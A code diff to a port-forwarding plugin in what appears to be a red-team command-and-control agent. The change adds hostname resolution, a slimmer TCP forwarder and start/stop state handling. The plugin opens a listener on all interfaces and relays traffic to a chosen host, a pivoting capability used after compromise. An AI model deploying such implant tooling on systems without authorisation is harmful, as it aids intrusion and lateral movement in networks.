@@ -14,6 +14,7 @@ namespace Agent
         private IMessageManager messageManager { get; set; }
         private bool running = false;
         private string start_task = String.Empty;
+        private TcpForwarderSlim fwdr;
         public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner)
         {
             this.messageManager = messageManager;
@@ -24,7 +25,8 @@ namespace Agent
             PortBenderArgs args = JsonSerializer.Deserialize<PortBenderArgs>(job.task.parameters);
             if (running)
             {
-                await this.Stop(job.task.id);
+                fwdr.Stop();
+                running = false;
                 return;
             }
 
@@ -32,22 +34,38 @@ namespace Agent
             string host = args.destination.Split(':')[0];
             string sPort = args.destination.Split(':')[1];
             int port = 0;
-            
-            if(!int.TryParse(sPort, out port))
+
+            if (!int.TryParse(sPort, out port))
             {
                 await messageManager.WriteLine($"Failed to get destination port.", start_task, true, "error");
                 return;
             }
 
-            new TcpForwarder().Start(
-                new IPEndPoint(IPAddress.Any, args.port),
-                new IPEndPoint(IPAddress.Parse(host), port));
+            IPAddress target = null;
 
+            if (!IPAddress.TryParse(host, out target))
+            {
+                try
+                {
+                    target = Dns.GetHostAddresses(host)[0];
+                }
+                catch (Exception ex)
+                {
+                    await messageManager.WriteLine($"Failed to resolve host: {ex.Message}", start_task, true, "error");
+                    return;
+                }
+            }
 
+            IPEndPoint local = new IPEndPoint(IPAddress.Any, args.port);
 
+            IPEndPoint remote = new IPEndPoint(target, port);
 
-           // await StartPortBenderAsync(args.port, host, port, job.cancellationtokensource, job.task.id);
+            this.fwdr = new TcpForwarderSlim();
 
+            fwdr.Start(local, remote);
+            running = true;
+
+            await messageManager.WriteLine($"Started Listener.", start_task, true);
         }
         //private async Task StartPortBenderAsync(int listenPort, string destinationHost, int destinationPort, CancellationTokenSource cts, string task_id)
         //{
